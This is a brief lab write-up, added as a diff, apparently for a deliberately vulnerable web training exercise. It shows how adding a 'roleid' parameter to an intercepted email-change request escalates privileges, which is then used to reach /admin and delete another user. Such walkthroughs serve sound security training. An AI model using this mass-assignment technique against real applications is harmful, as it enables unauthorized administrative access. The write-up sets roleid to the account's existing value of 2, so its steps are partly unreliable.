@@ -1,0 +1,23 @@
+login to your account(wiener) 
+try to change you email and intercept the request and send it to the repeater from there send the request
+response:
+{
+  "username": "wiener",
+  "email": "Email@email.com",
+  "apikey": "oIJE2vhrzB04KOCRWQndEZBv8UIKs4iv",
+  "roleid": 2
+}
+
+notice that there is a parameter called roleid have the value 2
+
+now try to change the email and intercept the request
+add the parameter roleid and set it to 2 in the request
+like this
+{
+"email":"Email@email.com",
+"roleid": 2,
+}
+and send the request
+now access /admin and delete carlos
+
+solved
